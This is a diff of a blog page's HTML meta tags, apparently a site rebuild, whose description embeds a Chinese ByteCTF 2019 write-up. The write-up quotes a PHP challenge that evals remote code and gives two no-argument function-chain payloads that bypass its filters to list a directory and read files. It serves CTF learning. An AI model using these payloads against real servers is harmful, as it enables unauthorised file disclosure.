@@ -174,7 +174,7 @@ crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次
 ord函数传入字符串的时候, 只返回第一个字符的ascii码
 localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&#34;小数点字符&#34;, 也就是点号
 php &gt; var_dump(localeconv()); array(18) { [&#34;decimal_point&#34;]=&gt; string(1) &#34;.&#34; [&#34;thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;int_curr_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;currency_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_decimal_point&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;positive_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;negative_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;int_frac_digits&#34;]=&gt; int(127) [&#34;frac_digits&#34;]=&gt; int(127) [&#34;p_cs_precedes&#34;]=&gt; int(127) [&#34;p_sep_by_space&#34;]=&gt; int(127) [&#34;n_cs_precedes&#34;]=&gt; int(127) [&#34;n_sep_by_space&#34;]=&gt; int(127) [&#34;p_sign_posn&#34;]=&gt; int(127) [&#34;n_sign_posn&#34;]=&gt; int(127) [&#34;grouping&#34;]=&gt; array(0) { } [&#34;mon_grouping&#34;]=&gt; array(0) { } } php &gt; pos() 函数是current函数的别名">
-  <meta property="og:locale" content="en-us">
+  <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2019-09-09T08:18:25+00:00">
@@ -182,102 +182,14 @@ php &gt; var_dump(localeconv()); array(18) { [&#34;decimal_point&#34;]=&gt; stri
     <meta property="og:image" content="https://dragonbox.top/image-20211114141103041.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://dragonbox.top/image-20211114141103041.png">
-<meta name="twitter:title" content="bytectf2019">
-<meta name="twitter:description" content="boring code
-source code
-&lt;?php
-function is_valid_url($url) {
-    if (filter_var($url, FILTER_VALIDATE_URL)) {
-        if (preg_match(&#39;/data:\/\//i&#39;, $url)) {
-            return false;
-        }
-        return true;
-    }
-    return false;
-}
-
-if (isset($_POST[&#39;url&#39;])){
-    $url = $_POST[&#39;url&#39;];
-    if (is_valid_url($url)) {
-        $r = parse_url($url);
-        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
-            $code = file_get_contents($url);
-            if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) {
-                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
-                    echo &#39;bye~&#39;;
-                } else {
-                    eval($code);
-                }
-            }
-        } else {
-            echo &#34;error: host not allowed&#34;;
-        }
-    } else {
-        echo &#34;error: invalid url&#34;;
-    }
-}else{
-    highlight_file(__FILE__);
-}
-思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload
-if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));
-echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));
-这两个payload都很精彩, 涉及的知识点如下:
-
-
+  <meta name="twitter:title" content="bytectf2019">
+  <meta name="twitter:description" content="boring code source code
+&lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\/\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &#34;error: host not allowed&#34;; } } else { echo &#34;error: invalid url&#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload
+if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv())))))))))))); 这两个payload都很精彩, 涉及的知识点如下:
 crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.
-
-
 ord函数传入字符串的时候, 只返回第一个字符的ascii码
-
-
-localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&quot;小数点字符&quot;,  也就是点号
-
-
-php &gt; var_dump(localeconv());
-array(18) {
-  [&#34;decimal_point&#34;]=&gt;
-  string(1) &#34;.&#34;
-  [&#34;thousands_sep&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;int_curr_symbol&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;currency_symbol&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;mon_decimal_point&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;mon_thousands_sep&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;positive_sign&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;negative_sign&#34;]=&gt;
-  string(0) &#34;&#34;
-  [&#34;int_frac_digits&#34;]=&gt;
-  int(127)
-  [&#34;frac_digits&#34;]=&gt;
-  int(127)
-  [&#34;p_cs_precedes&#34;]=&gt;
-  int(127)
-  [&#34;p_sep_by_space&#34;]=&gt;
-  int(127)
-  [&#34;n_cs_precedes&#34;]=&gt;
-  int(127)
-  [&#34;n_sep_by_space&#34;]=&gt;
-  int(127)
-  [&#34;p_sign_posn&#34;]=&gt;
-  int(127)
-  [&#34;n_sign_posn&#34;]=&gt;
-  int(127)
-  [&#34;grouping&#34;]=&gt;
-  array(0) {
-  }
-  [&#34;mon_grouping&#34;]=&gt;
-  array(0) {
-  }
-}
-php &gt;
-
-
-pos() 函数是current函数的别名">
+localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&#34;小数点字符&#34;, 也就是点号
+php &gt; var_dump(localeconv()); array(18) { [&#34;decimal_point&#34;]=&gt; string(1) &#34;.&#34; [&#34;thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;int_curr_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;currency_symbol&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_decimal_point&#34;]=&gt; string(0) &#34;&#34; [&#34;mon_thousands_sep&#34;]=&gt; string(0) &#34;&#34; [&#34;positive_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;negative_sign&#34;]=&gt; string(0) &#34;&#34; [&#34;int_frac_digits&#34;]=&gt; int(127) [&#34;frac_digits&#34;]=&gt; int(127) [&#34;p_cs_precedes&#34;]=&gt; int(127) [&#34;p_sep_by_space&#34;]=&gt; int(127) [&#34;n_cs_precedes&#34;]=&gt; int(127) [&#34;n_sep_by_space&#34;]=&gt; int(127) [&#34;p_sign_posn&#34;]=&gt; int(127) [&#34;n_sign_posn&#34;]=&gt; int(127) [&#34;grouping&#34;]=&gt; array(0) { } [&#34;mon_grouping&#34;]=&gt; array(0) { } } php &gt; pos() 函数是current函数的别名">
 
 
 <script type="application/ld+json">
